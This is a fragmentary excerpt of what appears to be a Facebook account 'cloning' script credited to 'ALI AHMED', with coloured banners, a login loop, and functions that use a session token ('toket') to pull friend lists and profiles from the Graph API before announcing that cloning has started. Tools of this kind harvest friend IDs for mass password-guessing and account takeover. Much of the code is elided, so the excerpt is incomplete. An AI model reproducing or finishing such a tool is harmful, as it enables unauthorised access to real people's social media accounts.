...
\033[1;91m  ♦♦♦CONTACT FACEBOOK /ALI AHMED @♦♦♦

\033[1;96m      _____  .____    .___     _____    ___ ___    _____  ___________________   
...
jalan("\033[1;96m•◈•   _____  .____    .___     _____    ___ ___    _____  ___________________   
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        os.system('xdg-open https://www.facebook.com/ALI AHMED.1
...
def pilih_super():
	...
	if peak =="":
		...
		r = requests.get("https://graph.facebook.com/me/friends?access_cookies="+toket)
		...
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_cookies="+toket)
	...
	jalan('                    \033[1;97m ༆°᭄ALI AHMED cloning Started Wait...')
	...
	def main(arg):
		...
		try:
			...
			a = requests.get('https://graph.facebook.com/'+user+'/?access_cookies='+toket)
